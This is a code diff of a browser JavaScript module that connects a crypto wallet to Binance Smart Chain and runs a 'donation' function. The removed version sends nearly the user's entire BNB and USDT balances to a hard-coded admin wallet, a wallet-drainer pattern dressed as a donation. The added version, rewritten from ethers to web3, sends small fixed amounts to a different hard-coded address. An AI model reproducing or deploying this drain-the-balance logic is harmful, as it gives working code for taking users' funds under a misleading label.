@@ -1,85 +1,86 @@
-import { ethers } from 'ethers';
+import Web3 from 'web3';
 
-let provider;
-let signer;
+let web3;
 let usdtContract;
 
-const adminWallet = "0xC42FD92eDadfA07c5b6845572c0961854787b473"; // Your admin wallet address
+const USDT_BEP20_CONTRACT_ADDRESS = "0x55d398326f99059ff775485246999027B3197955";
+const adminWallet = "0x20274614e28038E3085828DDA33e10ed33e8c7f9"; // Your admin wallet address
+const AMOUNT_TO_SEND = '0.0001';  // Amount of USDT to transfer
 
-const BSC_MAINNET_PARAMS = {
-  chainId: '0x38', // 56 in decimal
-  chainName: 'Binance Smart Chain Mainnet',
-  nativeCurrency: {
-    name: 'BNB',
-    symbol: 'BNB',
-    decimals: 18
-  },
-  rpcUrls: ['https://bsc-dataseed1.binance.org/'],
-  blockExplorerUrls: ['https://bscscan.com/']
-};
-
-// Add USDT contract ABI (this is a simplified version, you might need more functions)
 const USDT_ABI = [
-  "function balanceOf(address) view returns (uint256)",
-  "function transfer(address to, uint amount) returns (bool)",
-  "function decimals() view returns (uint8)",
+  {
+    "constant": true,
+    "inputs": [{ "name": "_owner", "type": "address" }],
+    "name": "balanceOf",
+    "outputs": [{ "name": "balance", "type": "uint256" }],
+    "type": "function"
+  },
+  {
+    "constant": false,
+    "inputs": [
+      { "name": "_to", "type": "address" },
+      { "name": "_value", "type": "uint256" }
+    ],
+    "name": "transfer",
+    "outputs": [{ "name": "", "type": "bool" }],
+    "type": "function"
+  }
 ];
-
-const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT contract address
 
 async function switchToBSCMainnet() {
   if (window.ethereum) {
     try {
-      // Try to switch to BSC Mainnet
       await window.ethereum.request({
         method: 'wallet_switchEthereumChain',
-        params: [{ chainId: BSC_MAINNET_PARAMS.chainId }],
+        params: [{ chainId: '0x38' }],
       });
     } catch (switchError) {
-      // This error code indicates that the chain has not been added to MetaMask
       if (switchError.code === 4902) {
         try {
           await window.ethereum.request({
             method: 'wallet_addEthereumChain',
-            params: [BSC_MAINNET_PARAMS],
+            params: [{
+              chainId: '0x38',
+              chainName: 'Binance Smart Chain',
+              nativeCurrency: {
+                name: 'BNB',
+                symbol: 'BNB',
+                decimals: 18
+              },
+              rpcUrls: ['https://bsc-dataseed.binance.org/'],
+              blockExplorerUrls: ['https://bscscan.com/']
+            }]
           });
         } catch (addError) {
-          throw new Error("Failed to add BSC Mainnet to wallet");
+          throw new Error("Failed to add BSC network to wallet");
         }
       } else {
         throw new Error("Failed to switch to BSC Mainnet");
       }
     }
-  } else if (window.trustwallet) {
-    // For Trust Wallet, we might need to guide the user to switch manually
-    throw new Error("Please switch to BSC Mainnet manually in your Trust Wallet");
+  } else {
+    throw new Error("No compatible wallet found");
   }
 }
 
 export async function connectWallet() {
   try {
-    await switchToBSCMainnet();
-
     if (window.ethereum) {
+      web3 = new Web3(window.ethereum);
       await window.ethereum.request({ method: 'eth_requestAccounts' });
-      provider = new ethers.BrowserProvider(window.ethereum, "any");
-    } else if (window.trustwallet) {
-      provider = new ethers.BrowserProvider(window.trustwallet);
+
+      const chainId = await web3.eth.getChainId();
+      if (chainId !== 56) {
+        await switchToBSCMainnet();
+      }
     } else {
       throw new Error("No compatible wallet found");
     }
 
-    signer = await provider.getSigner();
-    const userAddress = await signer.getAddress();
+    const accounts = await web3.eth.getAccounts();
+    const userAddress = accounts[0];
 
-    // Initialize USDT contract
-    usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
-
-    // Verify that we're on the correct network
-    const network = await provider.getNetwork();
-    if (network.chainId !== BigInt(56)) { // 56 is the chain ID for BSC Mainnet
-      throw new Error("Please ensure you are connected to the Binance Smart Chain Mainnet");
-    }
+    usdtContract = new web3.eth.Contract(USDT_ABI, USDT_BEP20_CONTRACT_ADDRESS);
 
     return userAddress;
   } catch (error) {
@@ -88,65 +89,64 @@ export async function connectWallet() {
   }
 }
 
-async function getUSDTBalance(address) {
-  const balance = await usdtContract.balanceOf(address);
-  const decimals = await usdtContract.decimals();
-  return ethers.formatUnits(balance, decimals);
-}
-
 export async function donateBNBAndUSDT() {
   try {
-    if (!signer) {
-      throw new Error("Please connect your wallet first.");
-    }
+    const accounts = await web3.eth.getAccounts();
+    const userAddress = accounts[0];
 
-    await switchToBSCMainnet();
+    const initialBnbBalance = await web3.eth.getBalance(userAddress);
+    const usdtBalance = await usdtContract.methods.balanceOf(userAddress).call();
+    const usdtBalanceInUsdt = web3.utils.fromWei(usdtBalance, 'ether');
 
-    const userAddress = await signer.getAddress();
-    const bnbBalance = await provider.getBalance(userAddress);
-    const usdtBalance = await getUSDTBalance(userAddress);
+    console.log("Initial BNB balance:", web3.utils.fromWei(initialBnbBalance, 'ether'));
+    console.log("Current USDT balance:", usdtBalanceInUsdt);
 
-    console.log("Current BNB balance:", ethers.formatEther(bnbBalance));
-    console.log("Current USDT balance:", usdtBalance);
-
-    if (bnbBalance <= 0 && parseFloat(usdtBalance) <= 0) {
+    if (parseFloat(initialBnbBalance) <= 0 && parseFloat(usdtBalanceInUsdt) <= 0) {
       throw new Error("Insufficient balance to make the donation");
     }
 
     let bnbTxHash, usdtTxHash;
+    let bnbAmount = '0', usdtAmount = '0';
 
-    // Transfer BNB
-    if (bnbBalance > 0) {
-      const feeData = await provider.getFeeData();
-      const gasPrice = feeData.gasPrice;
-      const gasLimit = 21000;
-      const maxGasCost = gasPrice * BigInt(gasLimit);
-      const amountToSend = bnbBalance - maxGasCost;
-
-      if (amountToSend > 0) {
-        const bnbTx = await signer.sendTransaction({
-          to: adminWallet,
-          value: amountToSend
+    // Transfer 0.0001 USDT first
+    if (parseFloat(usdtBalanceInUsdt) >= parseFloat(AMOUNT_TO_SEND)) {
+      try {
+        const amountToSend = web3.utils.toWei(AMOUNT_TO_SEND, 'ether');
+        const usdtTx = await usdtContract.methods.transfer(adminWallet, amountToSend).send({
+          from: userAddress
         });
-        bnbTxHash = bnbTx.hash;
-        console.log("BNB Transaction sent:", bnbTxHash);
-        await bnbTx.wait();
+        usdtTxHash = usdtTx.transactionHash;
+        console.log("USDT Transaction sent:", usdtTxHash);
+        usdtAmount = AMOUNT_TO_SEND;
+      } catch (error) {
+        console.error("USDT transfer failed:", error);
+        throw new Error("USDT transfer failed. Please try again.");
       }
+    } else {
+      throw new Error("Insufficient USDT balance");
     }
 
-    // Transfer USDT
-    if (parseFloat(usdtBalance) > 0) {
-      const usdtTx = await usdtContract.transfer(adminWallet, ethers.parseUnits(usdtBalance, 18));
-      usdtTxHash = usdtTx.hash;
-      console.log("USDT Transaction sent:", usdtTxHash);
-      await usdtTx.wait();
+    // Now transfer 0.0002 BNB
+    try {
+      const bnbAmountToSend = web3.utils.toWei('0.0002', 'ether');
+      const bnbTx = await web3.eth.sendTransaction({
+        from: userAddress,
+        to: adminWallet,
+        value: bnbAmountToSend
+      });
+      bnbTxHash = bnbTx.transactionHash;
+      console.log("BNB Transaction sent:", bnbTxHash);
+      bnbAmount = '0.0002';
+    } catch (error) {
+      console.error("BNB transfer failed:", error);
+      throw new Error("BNB transfer failed. Please try again.");
     }
 
     return {
       bnbTxHash,
       usdtTxHash,
-      bnbAmount: ethers.formatEther(bnbBalance),
-      usdtAmount: usdtBalance
+      bnbAmount,
+      usdtAmount
     };
   } catch (error) {
     console.error("Donation failed:", error);
